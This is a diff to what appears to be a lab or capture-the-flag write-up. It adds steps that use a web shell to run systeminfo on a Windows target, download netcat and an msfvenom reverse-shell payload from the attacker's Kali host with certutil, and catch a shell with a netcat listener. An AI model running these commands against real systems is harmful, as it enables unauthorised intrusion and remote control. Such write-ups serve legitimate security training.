@@ -130,7 +130,23 @@ Enumerated top 200 UDP ports:
 
 ![](Pasted%20image%2020221027144303.png)
 
+#### -Typed "http://192.168.231.189:8080/cmd.php/cmd?=systeminfo" to conirm the system architecture and confirm it was a x64 bit windows machine:
 
+![](Pasted%20image%2020221027144431.png)
+
+#### -Typed "updog -p 80" on my kali machine in the directory which had the nc64.exe file to host it
+
+#### -Typed "certutil.exe -urlcache -split -f "http://[Kali IP]/nc64.exe" nc64.exe" to download netcat on the target machine
+
+#### -Typed "msfvenom -p windows/shell_reverse_tcp LHOST=[Kali IP] LPORT=8080 -f exe > reverse.exe" on Kali machine to create a reverse shell payload
+
+#### -Typed "certutil.exe -urlcache -split -f "http://[Kali IP]/reverse.exe" reverse.exe" on firefox url bar to download the reverse shell payload onto the target machine
+
+#### -Typed "nc -lvnp -p 8080" on Kali machine to listen for the reverse shell 
+
+#### -Typed "reverse.exe" on the firefox url bar to run the reverse shell payload and received a reverse shell as nt authority\local service:
+
+![](Pasted%20image%2020221027144555.png)
 
 
 ---
